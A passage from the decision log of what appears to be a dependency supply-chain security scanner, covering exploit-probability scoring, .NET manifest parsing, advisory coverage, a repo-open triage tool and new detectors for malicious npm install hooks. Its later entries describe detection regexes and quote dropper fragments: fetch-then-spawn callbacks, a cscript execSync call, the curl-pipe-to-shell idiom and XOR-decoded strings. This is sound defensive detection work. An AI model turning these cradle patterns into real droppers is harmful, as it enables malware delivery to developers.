-race clean on check/datasource/cmd, go vet silent, gofmt no diffs. No live network in CI.

## D-114 — EPSS enrichment, Increment 3: report output + gating posture

Completes the EPSS arc. Two additions, both building on the D-112 client and D-113 wiring.

Report output — the peak exploit-prediction score is now STRUCTURED data, not only prose. A new
dependency-free `finding.ExploitScore{Peak, Percentile, CVE}` and a `Finding.EPSS *ExploitScore` field carry
the peak CVE across a finding's advisories; VC-008 populates it alongside the existing evidence note, so the
JSON report (via the Finding MarshalJSON alias) and the SARIF result properties (`epss`, `epssPercentile`,
`epssCVE`) expose exploit probability as a field a dashboard can rank or threshold on without parsing text.
`ExploitScore` lives in the `finding` package rather than importing `datasource/epss`, keeping `finding` at the
bottom of the import graph (the data source produces per-CVE scores; a check distills them to a per-finding
peak).

Gating posture — a new `-epss-gate <threshold>` (0..1) escalates a VC-008 finding from advisory to
gate-eligible when its peak EPSS is at or above the threshold (inclusive `>=`). This is the payoff of the whole
arc: CVE noise stays advisory by default (VC-008's DefaultGate is unchanged), but a team can opt into failing
the build — via the existing `-fail-on-eligible` — on ONLY the handful of vulnerabilities that are actually
being exploited in the wild. `-epss-gate` implies `-epss` (a threshold is meaningless without scores), and an
out-of-range value is a usage error.

The escalation is deliberately performed IN THE CHECK (VC-008 sets GateEligible when ctx.EPSSGate is met), not
in the verdict. This preserves the load-bearing D-06 invariant that `verdict.Evaluate` never gates on an
advisory finding: by the time the verdict runs, a high-EPSS finding is already classified gate-eligible, so no
advisory finding ever changes the exit code. It also means the escalated finding is still subject to the
verdict's presumed-version demotion — a version this tool presumed rather than observed (D-44) is demoted back
to advisory and can never gate, proven by the pre-existing `TestPresumedNodeCannotGate` (which already uses a
gate-eligible VC-008 finding on a presumed node).

Proof: VC-008 tests extended for the structured field (present when scored, nil otherwise) and gating
(escalates at/above threshold, stays advisory below, boundary inclusive, no escalation without `-epss-gate`); a
SARIF test asserts the three epss properties. Mutation-proven: `>=`→`>` fails the boundary test, dropping the
structured field fails the annotation test; restore green. CLI smoke: out-of-range exits 64, `-epss-gate`
implies `-epss`. Full suite green (34 packages), -race clean, go vet silent, gofmt no diffs.

## D-115 — EPSS enrichment, Increment 4: EPSS in the PDF report

The JSON and SARIF outputs already carried the peak exploit-prediction score as structured data (D-114); the
PDF only had it buried in the evidence prose. This gives EPSS a first-class place in the human report.

Under each VC-008 finding that carries a score, a dedicated line renders right below the severity/confidence/
score line — "Exploit prediction (EPSS): 0.944  -  100.0th percentile  -  CVE-2021-44228" — so the
"how likely to be exploited" axis reads alongside "how bad" and "how sure". The line is colour-coded by
magnitude so a reader scanning the page sees the hot ones without reading the numbers: peak >= 0.5 in the block
accent, >= 0.1 in the gate accent, the long tail muted. A finding that -epss-gate escalated to gate-eligible
also states the reason ("escalated to gate-eligible").

De-duplication: VC-008 embeds a "; peak EPSS …" note in its evidence string (kept, because the JSON/text
consumers read evidence). Showing that AND the new dedicated line would print the same number twice, so the PDF
strips the note from the DISPLAYED evidence via a small `evidenceForDisplay` helper. The strip is exact, not
heuristic: VC-008 sets f.EPSS and appends that suffix in the same branch, so the marker is present precisely
when f.EPSS is. The underlying finding is untouched — only the PDF's rendering trims it; every other format
keeps the full string.

Scope: the FINDINGS section only. The PACKAGE RISK table's fixed-width row format has no room for another
column and the node does not carry EPSS directly (it lives on the finding), so a per-package peak-EPSS column is
left as a possible later increment.

Proof: two PDF tests — a scored gate-eligible finding renders the EPSS line (score, percentile, CVE) with the
escalation reason and strips the redundant inline note while preserving the base evidence; a no-EPSS finding
renders no EPSS line. Mutation-proven: breaking the label and disabling the strip each fail the render test;
restore green. Full suite green (34 packages), -race clean, go vet silent, gofmt no diffs.

## D-116 — EPSS enrichment, Increment 5: per-package peak-EPSS column in the risk table

D-115 left the PACKAGE RISK table without EPSS, deferring a column as "a possible later increment"; this adds it.
Each at-risk row now carries the package's PEAK exploit-probability across its findings, so the table can be
scanned for "what is actually being exploited" without cross-referencing each finding in the section above.

The value is rolled up from the per-finding structured field (a node does not carry EPSS directly — it lives on
the finding, D-114): the row keeps the highest f.EPSS.Peak across n.Findings, formatted "%.3f", or a dash when
no finding on the package was scored (no CVE, or -epss was off). The fixed-width monospace format gains an
EPSS column between VERSION and DEPTH (PACKAGE narrowed 34->32 to hold it; the row still uses well under half
the content width in Courier). A legend is drawn only when at least one row is scored — same discipline as the
presumed-version legend.

Ordering: peak EPSS becomes a tiebreaker AFTER the existing keys (gate class, risk state, composed score) and
before the alphabetical fallback, so among otherwise-equal rows the more exploitable package floats up. It is
deliberately a tiebreaker, not a primary key: gate class and risk state still lead, so a block-class package
never sinks below an advisory one merely because the advisory one has a higher EPSS.

Proof: two PDF tests — the column header, a peak value, and the legend all render within the risk-table
section, and a higher-EPSS package sorts ahead of an equal-score peer whose name sorts first; a run with no
scored findings draws no legend. The assertions are scoped to the substring after "PACKAGE RISK": an earlier
version passed against the whole document and failed to catch either mutation, because the SCOPE roots line and
the D-115 findings-section EPSS line repeat the same names and score ahead of the table. Mutation-proven after
scoping: forcing the cell to a dash fails the value test, dropping the tiebreaker fails the ordering test;
restore green. Full suite green (34 packages), -race clean, go vet silent, gofmt no diffs.

## D-117 — EPSS enrichment, Increment 6: enrichment stats in coverage output

The EPSS stage already emitted a DataSourceCoverage entry carrying the generic datasource.Stats (queried /
cache / network / gaps), but its EPSS-specific context — how many vulnerable coordinates were enriched and how
many advisories were resolved to a CVE via OSV /v1/query — went only to ephemeral stderr, and the OSV
alias-resolution step contributed no coverage at all. This surfaces that context in the report.

The EPSS DataSourceCoverage now carries a Note built by a new testable formatter, epss.EnrichmentSummary:
"scored N of M CVE(s) (K without a score); enriched V vulnerable coordinate(s); resolved A advisory alias(es)
to CVE via OSV /v1/query", with a "resolution was partial" caveat appended when the advisory->CVE step (from
osv.CVEAliases) itself degraded. The alias-resolution count is derived from the map CVEAliases already returns
(len of advisory->CVE map), so no signature change was needed. The same string replaces the ad-hoc stderr line,
so stderr and the report now say the same thing.

The DataSourceCoverage.Note field existed (used by no emitter) and already serialized into the JSON report; it
is now also RENDERED in the PDF's DATA SOURCE COVERAGE section, a small addition that benefits any source that
sets a note, not only EPSS. This keeps to the D-24 discipline — what the scan did and did not cover is stated in
the artifact, not left on a terminal that a CI pipeline discards.

Proof: EnrichmentSummary unit test (scored = cache+net, gaps, coordinates, aliases, and the degraded caveat
only when partial); a PDF test that a source Note renders in the coverage section; a JSON test that
data_sources[].note and .stats reach the report. Mutation-proven: not rendering the Note fails the PDF test,
renaming a summary label fails the formatter test; restore green. Full suite green (34 packages), -race clean,
go vet silent, gofmt no diffs.

## D-118 — NuGet: the modern .NET dependency surface (PackageReference et al.)

Before this, the NuGet adapter read only packages.lock.json, paket.lock, and packages.config. Every project
using PackageReference — the SDK-style default since VS2017 / .NET Core, and the majority of .NET repositories
today — resolved to ZERO packages and was disclosed as a recognized-but-unresolved manifest. A live-fire scan
of Polly (59 PackageVersion entries at the repo root) surfaced exactly this blind spot.

A new msbuild.go reads the full modern declared surface, all FLAT (declared, not locked — D-24):
PackageReference in .csproj/.vbproj/.fsproj/.vcxproj/.proj (Version as attribute or child element); Central
Package Management (Directory.Packages.props PackageVersion + GlobalPackageReference); Directory.Build.props /
.targets; .nuspec dependencies (incl. grouped); .config/dotnet-tools.json (local tools that execute);
project.json (pre-VS2017 .NET Core); and paket.dependencies when no paket.lock is present. Static only (D-04):
nothing restores or executes.

Two correctness points drove the design:

- Central Package Management and Directory.Build.props are discovered by MSBuild by walking UP the tree, so a
  repo-root version table governs projects nested in src/*. The reader walks ancestor directories
  outermost-first (stopping at the .git root, never reading outside the scanned tree) so the NEAREST definition
  wins — reading only the project's own directory is what left Polly's versionless PackageReferences
  unresolvable.

- Versions that cannot be pinned statically — floating (1.2.*), open ranges ([1.0,2.0)), unexpanded
  $(Property) — are DISCLOSED as unresolved with a reason, never guessed and never dropped (D-59). OSV needs an
  exact coordinate; inventing one would be a false-clean. Exact bracketed pins ([1.2.3]) and one-level
  $(Prop) expansion from collected MSBuild properties ARE resolved.

project.assets.json (the restore output) is the one modern format with a REAL resolved transitive tree, so
when present it is preferred and produces package->package edges rather than a flat list (and is not marked
flat). Lockfile precedence is preserved: a resolved packages.lock.json / paket.lock always wins. A project
mid-migration (packages.config alongside PackageReference) is covered by BOTH via mergeDeclared, so neither
half becomes a blind spot.

Proof: TestMSBuildFormatsResolve (13 formats, each of which resolved to zero before); transitive-edge test for
project.assets.json; D-59 disclosure test (floating/range/no-version/missing-prop all disclosed, none
fabricated, count exact, marked flat); lockfile-precedence and packages.config+PackageReference merge tests.
Mutation-proven: accepting floating versions fails the disclosure test, skipping the CPM lookup fails the
Central Package Management test; restore green. Full suite green (34 packages), -race clean, go vet silent,
gofmt no diffs.

## D-119 — Advisory coverage: a post-expansion OSV pass (close the prefetch/expansion gap)

The advisory prefetch runs BEFORE transitive expansion, so it can only ask OSV about coordinates the manifests
already pinned. Two very common shapes were therefore never advisory-checked at all, and both produced a
clean-looking "0 advisory" verdict backed by ZERO OSV queries:

  - Packages DISCOVERED by expansion. A live-fire scan of cecil-protocol left 186 expansion-discovered
    packages unchecked — hiding a real esbuild advisory.
  - A manifest that pins nothing at prefetch: a Poetry-style pyproject.toml of version RANGES with no lockfile,
    whose direct dependencies are unresolved placeholders at prefetch time and only gain versions during
    expansion. pyrsistencesniper reported "0 advisory" off zero queries.

Fix: after expansion, a second OSV pass asks about every package that now has a version and was not queried the
first time. The OSV client is hoisted out of the prefetch block and reused, so it is cached and batched —
already-known coordinates cost nothing. Its stats are FOLDED INTO the existing "osv" coverage line (queried,
advisories, cache, net, gaps, not-found all summed), so the report states one honest total rather than two
partial ones, and a post-expansion error degrades that same line.

Two honesty guards (D-59, D-24):
  - The selection predicate is pinned by a test: the second pass selects exactly the non-root, KindPackage,
    versioned nodes not already in ctx.Advisories — expansion-added packages and range-pinned directs, never
    hooks or versionless placeholders.
  - If resolved packages exist and NONE was advisory-checked, a loud stderr WARNING says so: a clean
    vulnerability verdict there is explicitly NOT a verified one.

EPSS enrichment MOVED to run after this pass (it was previously inside the prefetch block), so it scores the
complete advisory set — including packages discovered during expansion — and it now shares the hoisted OSV
client for CVE-alias resolution (skipped under -no-osv, as before under -offline).

Proof: two selection/coverage tests pin the predicate and the zero-coverage detection (cmdScan itself is not
unit-testable, so these pin the logic that drives it, matching the codebase's existing main-package test
pattern); an offline end-to-end scan runs the new path with no regression. Full suite green (34 packages),
-race clean, go vet silent, gofmt no diffs.

## D-120 — Miasma/Hades companion artifacts: RepoGuard, IOC feed, detection writeup

The Miasma/Hades campaign (Azure/durabletask, 2026-06-05) executes the moment a developer OPENS a repository in
an editor or AI coding agent — via checked-in configuration (an obfuscated setup.js, a VS Code folderOpen task,
agent hook settings) — not at dependency install time. depSNORT answers "what happens when I INSTALL these
dependencies?"; this on-open surface is out of that scope by construction, so three companion artifacts are
added rather than bent into the scanner:

  - tools/ihbv-repoguard.py — a standalone, read-only, stdlib-only Python triage tool that grades a
    freshly-cloned repo's on-open / on-attach execution surface (.vscode/tasks.json runOn:folderOpen,
    devcontainer initializeCommand, .claude / .cursor / .gemini hooks, .mcp.json, .envrc, git hooks) by whether
    it also reaches the network or obfuscates its payload, and checks every candidate file against
    campaign-specific IOCs. It never executes, installs, or imports anything from the target and discloses what
    it could not read (mirroring depSNORT's own D-04 / D-24 discipline). It lives in tools/ alongside the
    existing Python helpers rather than in the Go binary, keeping the scanner stdlib-only (D-10).

  - docs/ioc-miasma-hades.json — a ready-to-use depSNORT IOC feed (the -ioc / VC-003 format): durabletask
    1.4.1/1.4.2/1.4.3 as critical malware, plus a version-less high "compromised-upstream" indicator for any
    durabletask release. Validated end-to-end: a requirements.txt pinning durabletask==1.4.1 scanned with
    -ioc produces the expected VC-003 BLOCK finding (exit 1).

  - docs/iHBV_Miasma_Hades_protection_detection.pdf — the campaign protection/detection writeup.

No Go code changed. Proof: RepoGuard py_compiles, and on a crafted fixture flags a folderOpen VS Code task and
a Miasma C2 IOC (exit 1) while staying silent on an install-time-only fixture; the IOC feed loads through
depSNORT and matches the poisoned coordinate. go build clean.

## D-121 — Adjudication mechanisms: prove findings true or false, never exempt them

The self-assessment run under D-120's quarantine workflow surfaced two standing detections on depSNORT's own
repo: RepoGuard flagging its own signature table as campaign IOCs, and the self-scan flagging the adversarial
fixtures. The cheap fix — exempt the tool's path, exclude testdata/ — is the allowlist anti-pattern this
project has rejected at every prior fork (D-104, D-108, D-110/111): every exemption is a place a real attack
can hide. The goal is never to silence a finding; it is to go further and PROVE it true or false, with the
proof recorded. Two mechanisms:

RepoGuard --verify (tamper adjudication). Takes a sha256sum-format manifest of known-authentic files
(tools/ihbv-authentic.sha256 ships the repo's three Python tools). A listed file whose full-file hash matches
has its findings ADJUDICATED FALSE — they remain in every output with their evidence, labeled with the proof,
and stop counting toward the exit code, because the adjudication IS the evidence. A hash MISMATCH becomes a
new CRITICAL TAMPERED finding: a file wearing a known-authentic name with non-authentic content is precisely
the planted-lookalike threat, and the file's other findings keep counting (a failed verification revokes
nothing-to-hide status, it never grants it). Hashing is full-file and chunked — a MAX_READ-capped hash would
let a payload appended past the cap verify as authentic. Trust caveat stated in the tool and the manifest: a
manifest inside the repo it verifies can be tampered alongside the files; the real chain is YOUR trusted
repoguard + YOUR out-of-band manifest against the quarantine clone. Where an exemption would have made the
tool blind to a tampered copy of itself, --verify makes that copy the loudest thing in the report.

depSNORT containment (reachability adjudication). Every finding now carries ReachableRoots — the complete,
sorted set of scan roots that reach its node over ANY edge type (hooks and artifacts attribute through their
declaring subtree; DepPath's single shortest chain cannot carry this). With -real-roots (comma-separated
substrings naming the roots the operator actually builds/ships), a finding NO designated root reaches is
labeled Contained, with the proof in its evidence and in the structured field (JSON reachable_from_roots /
contained; SARIF reachableRoots / contained properties). The invariant, test-pinned: containment NEVER changes
a gate class, a count, or the exit code — a contained block still blocks. It is an adjudication label riding
on an otherwise untouched finding, unlike the recency/presumed demotions which deliberately re-gate.

Proof: three verdict tests (complete multi-root attribution incl. hook edges; adjudicates only unreachable
findings, with evidence; gate/counts/exit byte-identical with and without the label). Mutation-proven:
softening a contained finding's gate fails the invariant test; truncating reachability to direct children
fails the attribution test. RepoGuard demonstrated live: authentic target -> both standing findings
adjudicated false, exit 0; one appended line -> CRITICAL TAMPERED, exit 1; no --verify -> behavior unchanged.
Self-scan with -real-roots ihbv.io reproduces the manual containment proof automatically: 32/32 findings
contained, counts and exit 1 unchanged. Full suite green (34 packages), -race clean, vet silent, gofmt clean.

## D-122 — v0.8.0: the overdue cut

v0.7.5 was cut at D-39. Eighty-two decisions have landed since — the largest span any release of this project
has carried — and every one is backwards-compatible: new opt-in flags, additive report fields, wider coverage.
Semver says minor; v0.8.0 it is (a 1.0 declaration is a product decision, deliberately not smuggled into a
routine bump). The bump is one line in pyproject.toml (F-06: the Go binary, the wheel, and `depsnort version`
all derive from it) plus the two README examples that name the current release.

What v0.8.0 carries over v0.7.5, by arc:

  - Drift axis (D-40..): baseline capability/publisher-lineage comparison (VC-010/VC-011).
  - Install-surface families: VC-002f..j (composer cradles, VC-002g persistence, VC-002h cgo flag injection,
    VC-002i build-tag-gated init evasion with AST reachability, VC-002j load-time native exec), package-runner
    and manager-install extraction across ecosystems, per-dependency vendor/module-cache attribution.
  - Resolution: static pruned Go MVS proven against the go list oracle, per-ecosystem asserted-tier dispatch,
    deps.dev asserted resolver, full-send recursive defaults with honest gap disclosure.
  - Lockfile/manifest coverage sweep: uv.lock (incl. rootless), poetry.lock, pdm.lock, pylock.toml (PEP 751),
    Pipfile, pnpm-lock.yaml, bun.lock, build-backend disclosure — and the modern .NET surface (D-118):
    PackageReference, Central Package Management, Directory.Build.props, .nuspec, dotnet-tools.json,
    project.json, paket.dependencies, project.assets.json.
  - Live-fire precision hardening (meshclaw, OpenShell, Kibana, open-webui, elastic-agent, beats): every fix
    principled and mutation-proven, never an allowlist (D-96..D-111).
  - Advisory correctness: post-expansion OSV pass closing the prefetch/expansion false-clean gap (D-119),
    tolerant npm packument parsing, snapshot import/export, bundled fallback discipline.
  - EPSS exploit-prediction arc (D-112..D-117): FIRST.org client, VC-008 annotation + ranking via cached OSV
    /v1/query alias resolution, structured scores in JSON/SARIF/PDF, opt-in -epss-gate, coverage notes.
  - Adjudication doctrine (D-120/D-121): the Miasma/Hades companions (RepoGuard, IOC feed) and the two
    proof mechanisms — RepoGuard --verify tamper adjudication and -real-roots containment with complete
    root attribution — so a finding is proven true or false, never exempted.

Validated: `make build` derives v0.8.0 from pyproject.toml and `depsnort version` reports it; full suite green
(34 packages); no other file hard-codes the version (test fixtures using "v0.7.5" as arbitrary strings, the
PERFORMANCE.md historical baseline, and D-39's own text are records, not claims, and stay).

## D-123 — README sweep: close the documentation gap behind v0.8.0

A full sweep of every repo document against the actual binary (usage text, `checks` registry output) and source
tree found README.md describing roughly the v0.7.5 feature set, six increments and one whole ecosystem-surface
arc behind. docs/RELEASING.md, docs/PERFORMANCE.md, NOTICE.md, SECURITY.md, and docs/DECISIONS.md itself were
clean — the version-literal guard test (`TestREADMEVersionLiteralsMatchPyproject`) already passed at v0.8.0, and
PERFORMANCE.md's "Baseline (v0.7.5)" header is a correctly-dated historical record, not a claim about current
behavior.

README.md gaps, each verified against the running binary or source before editing (not assumed from memory):

  - Ecosystem table: PyPI was missing uv/poetry/pdm/pylock/Pipfile; npm was missing pnpm/bun; NuGet still
    described only the three legacy lockfiles, omitting the entire D-118 modern .NET surface; the Go row
    FALSELY claimed install-surface was "not yet extracted" when go:generate/cgo-flag/init-evasion/package-
    runner/cache-attribution extraction has shipped since OPU-28.
  - VC-check coverage: VC-002g/h/i/j and VC-012 were entirely absent from both the summary list and the
    Install-surface extraction section. Each new bullet's gate class was verified against the actual
    `check.Meta` in vc002_family.go / vc012_yanklure.go rather than asserted — this caught a wording error of
    my own (VC-002j was drafted as "reaches network/shell" before checking; the code says "bundled native
    binary at import time").
  - Zero mention anywhere of the EPSS arc (`-epss`/`-epss-gate`, D-112..117), the post-expansion advisory pass
    (D-119), or the adjudication doctrine (`-real-roots` containment, RepoGuard `--verify`, D-120/121).
  - The "recognized manifest no adapter can resolve" example list named `.csproj`/`.vcxproj` and `Pipfile` as
    UNRESOLVABLE — exactly the manifests D-118 and the D-97 Increment 4 patch fixed. Left uncorrected, this
    would have told a reader the opposite of what the tool now does.
  - Roadmap: pnpm/Poetry/uv were listed under "⬜ planned, not implemented" — false, all three ship. Missing
    entirely: pylock/Pipfile/bun/NuGet-modern, VC-002g..j, VC-012, the post-expansion pass, EPSS, and the
    adjudication mechanisms.
  - Project layout omitted `internal/versiondrift`, `internal/ciactions`, `internal/securefs`, `internal/
    semver`, `internal/pep508`, and `tools/` (RepoGuard + the org/priority scan drivers) — all real,
    referenced-elsewhere-in-this-file directories with no line in the tree diagram.
  - New sections added: an EPSS paragraph under Threat-intelligence tiers; a containment-adjudication paragraph
    under Coverage is part of the verdict; a full "Repo-open execution surface (RepoGuard)" section (the tool,
    `--verify`, the Miasma/Hades IOC feed, and the recommended quarantine workflow) — none of which had any
    home in the document before.

Proof: `TestREADMEVersionLiteralsMatchPyproject` still passes (the edits didn't touch either version literal);
every file path introduced in new prose (`tools/ihbv-repoguard.py`, `tools/ihbv-authentic.sha256`,
`docs/ioc-miasma-hades.json`) resolves on disk; markdown code-fence count is balanced; full suite green (34
packages), gofmt clean. No Go code changed — this is a documentation-only correction.

## D-124 — OPU-32: BRIDGEHEAD (XOR decode-to-exec, async/PowerShell cradle)

CloudSEK's BRIDGEHEAD writeup (Aug 20 2026) describes an npm typosquatting campaign whose 40-package dropper
(`scripts/postinstall.js`) does two things depSNORT's install-surface analyzer did not catch: decodes its C2
URL and PowerShell bridge with a hand-rolled XOR-over-fromCharCode loop (not base64/hex/gzip, not the
existing charCodeAssemblyRe batch-assembly shapes — one fromCharCode call per cipher-loop iteration), and
fetches-then-execs in two JS-native shapes cradleRe's single-line shell-pipe idiom cannot see: a callback-based
`https.get(url, () => spawn(dest))` on native Windows, and — inside WSL — a PowerShell command string
assembled at RUNTIME from decoded fragments, so the actual fetch+run cradle never exists as literal source
text for any regex to match, encoded or not. A byte-faithful reproduction (live IOCs replaced with RFC 5737 /
`.invalid` placeholders) scored exit 0 on default flags and topped out at exit 2 (gate-eligible, never
flagged) even under `-fail-on-eligible` — no flag combination pre-patch blocked it.

Three new structural markers in `internal/installsurface/analyze.go`, all zero-execution / regex-based (D-04
— detecting the obfuscation IS the finding, never decoding and reasoning about the payload):

  - `xorCharCodeRe` — a `^` INSIDE a `fromCharCode(...)` argument list. Gated tightly so an XOR used for
    something unrelated elsewhere in the file (checksum math, RNG mixing) does not match. Sets CapObfuscation.
  - `asyncCradleRe` — a network fetch call with an exec-family token as an argument WITHIN THE SAME STATEMENT
    (bounded at the next `;`). The JS-native analog of `curl ... | sh`. Deliberately same-statement-scoped to
    avoid re-triggering the D-25/D-28 esbuild FP (fetch in one statement, exec of an already-downloaded binary
    in an unrelated LATER one) — verified directly against the actual esbuild_regression_test.go fixture, not
    a synthetic stand-in (see Proof). Sets CapCradle -> VC-002f, block-tier.
  - `interpreterSpawnRe` + co-occurrence — a spawned scripting interpreter (powershell/pwsh/cmd/wscript/
    cscript/mshta) is CapExec alone (some legitimate installers shell out to one for benign reasons); it only
    escalates to CapCradle when CapObfuscation is ALSO present in the same hook. This is what closes the WSL
    branch: it cannot decode or resolve a runtime-assembled command string (D-04 forbids trying), so it scores
    the co-occurrence of "this hook decodes something" and "this hook hands something to a script interpreter"
    as itself the finding — detecting indirection, not payload semantics, consistent with the package's stated
    philosophy.

Proof: five unit tests (opu32_test.go) covering all three markers' positive and negative cases, including the
D-25 esbuild-FP guard the two exec/fetch markers must not re-trip. One gap found in the handoff's own test
suite during review — its shipped asyncCradleRe negative used a synthetic `downloadPrebuiltBinary(url)`
wrapper that never reaches any of the four matched network verbs, so it never actually exercised the
same-statement boundary it claimed to guard — closed by adding a test against the REAL
esbuild_regression_test.go fixture (fetch in one function, execFileSync in a separate later one), which
passes. Swept the full existing testdata/ corpus for any file combining an interpreter spawn with a decode-ish
token: none found, confirming no FP regression from the co-occurrence marker. Live end-to-end: a byte-faithful
BRIDGEHEAD fixture (inert placeholders) scores exit 0 pre-patch, **exit 1 (VC-002f block/critical, VC-002e
gate-eligible/high)** post-patch, matching the handoff's claimed table exactly. Full suite green (34
packages), -race clean, go vet silent, gofmt no diffs.

Residual, disclosed rather than silently accepted: the interpreterSpawnRe co-occurrence check is a heuristic
(decode + separate interpreter-spawn scored together, not a resolved cradle) and asyncCradleRe's bounded
window is a heuristic bound, not an AST-balanced statement parser (RE2 has no backreferences or lookaround for
real statement boundaries) — both worth a pass against a larger live-fire corpus if FP reports surface. The C2
octet-array assembly (`['193','70',...].join('.')`) was investigated and confirmed NOT a gap (CapNetwork
detection was never string-literal-only). The WSL-detection triad itself is not escalated as a standalone
signal — it still reads as ordinary CapEnv, same as any other env read; a dedicated WSL-fingerprint +
payload-fetch/exec co-occurrence check is scoped out as a distinct future increment.

## D-125 — OPU-33: decodeRe's hex alternative matched an ENCODE, not a decode

Found during an independent FP sweep of the OPU-32 markers against real-world install scripts (esbuild,
edge-js, ntsuspend, all under `-fail-on-eligible`). All three new OPU-32 markers came back clean — none fired
anywhere in the sweep, including on esbuild, the exact package D-25/D-28's own design comments already cite as
the FP case to avoid. The sweep's one hit was VC-002e on esbuild, and it traced to `decodeRe`
(`internal/installsurface/analyze.go`), pre-existing since the initial public release (commit `e3dd322`) —
confirmed by `git blame` and by reproducing the identical finding against the pre-OPU-32 binary.

`decodeRe`'s hex alternative was a bare `['"]hex['"]\s*\)` — it matched the literal string `hex")` anywhere in
a file. esbuild's real `install.js` computes `crypto.createHash("sha256").update(bytes).digest("hex")` to
verify the downloaded binary's checksum: an ENCODE (bytes -> hex string, for display/comparison — the thing a
security-conscious installer SHOULD do), not a decode. The bare literal can't distinguish that from
`Buffer.from(x, 'hex')`, a genuine decode.

Fix: tightened to the same context-required shape the base64 alternative in the same regex already used —
`Buffer\.from\s*\([^)]*['"]hex['"]|from_?hex|hex::decode` — mirroring base64's `Buffer\.from(...,'base64')`
plus the naming-convention alternatives already present for Rust (`base64::decode`/`base64::engine`). No
existing test depended on the old bare shape (verified before touching it).

The repo's own D-25 esbuild regression fixture (`esbuildLikeInstallJS`) was a faithful REDUCTION that did not
include this real line — extended it with the actual checksum-verify idiom so the existing regression test
(`TestEsbuildInstallerNotObfuscated`) exercises the real FP directly, rather than adding a parallel synthetic
test that would prove less. Mutation-proven: reverting the regex to its pre-fix shape fails both the new
negative tests (hex ENCODE no longer suppressed) and the now-faithful esbuild fixture test; restore green.
Live end-to-end: the sweep's cited shape now scores exit 2 with only the legitimate VC-002b (real network
egress) firing — VC-002e no longer trips. Full suite green (34 packages), -race clean, go vet silent, gofmt no
diffs.

## D-126 — OPU-34: VC-002f (the cradle block) didn't generalize past the sample it was tuned against

Found during a true-positive generalization sweep requested after OPU-32/33 merged: built faithful structural
reproductions (IOCs replaced with inert RFC 5737/.invalid placeholders) of three independently-disclosed 2026
npm campaigns — axios/plain-crypto-js (UNC1069/Sapphire Sleet, March 2026), Mastra/easy-day-js (Sapphire
Sleet, June 2026), and a Yandex-linked dependency-confusion cluster (May 2026) — and ran them through the
OPU-32/33 binary. VC-002e (obfuscation+exec) generalized cleanly, 3 for 3. VC-002f (critical/block, the
cradle check) generalized 0 for 3.

Two distinct structural causes: (1) `asyncCradleRe`'s window stopped at the first `;` after the fetch call —
real callbacks routinely run several statements (`res.on('data', ...)`, buffering) before the actual spawn,
the norm rather than the exception, confirmed on both Mastra and the dependency-confusion cluster. (2)
`interpreterSpawnRe` only matched `spawn`/`spawnSync` with the interpreter name as an *isolated* literal
argument; axios's real technique is `child_process.execSync(\`cscript.exe //nologo //B "${path}"\`, ...)` —
wrong function name and wrong argument shape, both missed.

Fix, and a false start worth recording: the first attempt widened the window to a flat character count
calibrated against a real esbuild `install.js` fetch (~1,544 chars to the nearest unrelated exec call). It
passed the new tests and immediately failed the repo's own `esbuild_regression_test.go` — the condensed
901-char fixture puts the same shape only 294 characters apart, well inside that window. Character distance
isn't a stable signal; it depends on how much unrelated code sits between two calls, which varies by an order
of magnitude between a real file and a same-shape test double. The suite caught it before it shipped.

Actual fix is structural, not distance-based: `asyncCradleCandidateRe` captures a broad candidate span (fetch
call → callback introducer → up to 1,000 chars, now just a sanity bound) and a new Go-level check,
`namedFunctionDeclRe` (`\bfunction\s+[A-Za-z_$][\w$]*\s*\(`), rejects any candidate whose span crosses into a
*named* function declaration — the shape esbuild's real installer uses (the exec call lives in a separately
declared, separately called function; Mastra and the dependency-confusion cluster nest everything as
anonymous arrows directly inside the original callback, crossing no named declaration). Same
regex-candidate-plus-Go-filter pattern the codebase already uses for OPU-27's runner-target check.
`interpreterSpawnRe` was broadened to the full `exec`/`execSync`/`execFile(Sync)?`/`spawn(Sync)?` family,
matching the interpreter name as a whole-word token anywhere inside the first quoted/backtick argument (the
argument must still open with a quote/backtick — a variable-built command still doesn't match, a documented
residual gap, not claimed as closed).

Independent review before merge, mutation-proving all three claimed mechanisms individually (revert the
mechanism, confirm the expected test subset fails, restore, reconfirm green):

- The window widening (Gap A) and `interpreterSpawnRe` broadening (Gap B) are both genuine and independently
  load-bearing — reverting Gap A breaks Mastra/dep-confusion only (both use bare `spawn`, unaffected by Gap
  B); reverting Gap B breaks axios only (Mastra/dep-confusion don't depend on it).
- The named-function structural filter is genuine — but only after discarding two vacuous proof attempts
  first. A self-authored corrected test using `execSync(` as the trigger verb never matched at all
  (`asyncCradleCandidateRe`'s alternation requires the literal `child_process.exec` immediately followed by
  `\s*\(` — `execSync(` inserts `Sync` in between). More importantly, the *shipped* `opu34_test.go`'s own
  esbuild-shape negative test passed for the wrong reason: its fixture pads 1,500 bytes of filler between the
  fetch and the exec call, which by itself pushes the span past `asyncCradleCandidateRe`'s 1,000-char capture
  window — the test never reaches `namedFunctionDeclRe` at all. Confirmed by removing the named-function
  rejection in `scanCaps` and observing the shipped test still passed.

Fix for the review finding: rather than patch the shipped synthetic (following the OPU-32/33 precedent of
anchoring regression proof to a real fixture over a synthetic stand-in), added
`TestEsbuildInstallerNamedFunctionExcludesCradle` to `esbuild_regression_test.go` against the real, un-padded
`esbuildLikeInstallJS` fixture, where the nearest exec call sits ~294 characters from the fetch call — well
within the 1,000-char window, so exclusion can only come from the named-function filter itself. Mutation-
proven: removing the filter's rejection fails this new test while leaving the shipped (window-distance-based)
test passing, isolating exactly what each test does and doesn't prove. The shipped test's own comment was
extended to document this distinction rather than leave a misleading claim standing.

Live end-to-end, same binary, npm project + lockfile-resolved dependency with a real postinstall hook (not
just Go-level unit tests): BRIDGEHEAD (the OPU-32 sample) still blocks (VC-002a/e/f, exit 1) — unchanged. The
esbuild FP shape still scores clean of cradle/obfuscation (VC-002a/b only, exit 0) — unchanged. All three
2026-campaign reproductions (axios, Mastra, dependency-confusion) now block (VC-002a/e/f, exit 1) — reversing
the 0/3 pre-patch result. Full suite green (34 packages), `-race` clean on `internal/installsurface`, `go
vet` silent, `gofmt` no diffs.

Residual limitations, disclosed rather than closed: variable-built exec commands
(`command.push('powershell.exe'); exec(command, ...)`, sudo-prompt's real pattern) still evade
`interpreterSpawnRe` — closing this needs light dataflow tracking, a bigger change than this patch attempts.
The 1,000-char candidate window is a sanity bound, not a real parser — an adversarial or unusually long
callback could in principle push a real spawn outside it. The named-function filter has a known inverse
failure mode: a cradle whose author deliberately wraps the spawn in a named (not anonymous) helper —
`function launch(cmd) { spawn(cmd); }` called from inside the fetch callback — would now be excluded, even
though it's genuinely part of the same cradle. Not observed in any of the three real samples tested; worth a
